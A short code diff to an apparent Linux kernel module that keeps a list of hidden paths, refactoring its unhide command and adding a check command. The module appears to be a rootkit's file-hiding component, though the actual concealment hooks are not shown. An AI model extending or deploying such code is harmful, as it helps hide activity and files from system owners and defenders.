@@ -91,9 +91,10 @@ bool cmd_hide(char *arg, uint64_t len) {
 }
 
 bool cmd_unhide(char *arg, uint64_t len) {
-  struct hidden_path hp, *pre = NULL, *trav = hst.head;
+  struct hidden_path *pre = NULL, *trav = hst.head;
+  struct path path;
 
-  if (kern_path(arg, LOOKUP_FOLLOW, &hp.path) != 0) {
+  if (kern_path(arg, LOOKUP_FOLLOW, &path) != 0) {
     debgf("failed to obtain the path from %s", arg);
     return false;
   }
@@ -101,7 +102,7 @@ bool cmd_unhide(char *arg, uint64_t len) {
   debgf("unhiding path: %s", arg);
 
   while (trav != NULL) {
-    if (is_same_path(&trav->path, &hp.path))
+    if (is_same_path(&trav->path, &path))
       break;
 
     pre  = trav;
@@ -120,4 +121,22 @@ bool cmd_unhide(char *arg, uint64_t len) {
   kfree(trav);
 
   return true;
+}
+
+bool cmd_check(char *arg, uint64_t len) {
+  struct hidden_path *trav = hst.head;
+  struct path path;
+
+  if (kern_path(arg, LOOKUP_FOLLOW, &path) != 0) {
+    debgf("failed to obtain the path from %s", arg);
+    return false;
+  }
+
+  debgf("checking path: %s", arg);
+
+  for(;trav != NULL; trav = trav->next)
+    if (is_same_path(&trav->path, &path))
+      return true;
+
+  return false;
 }
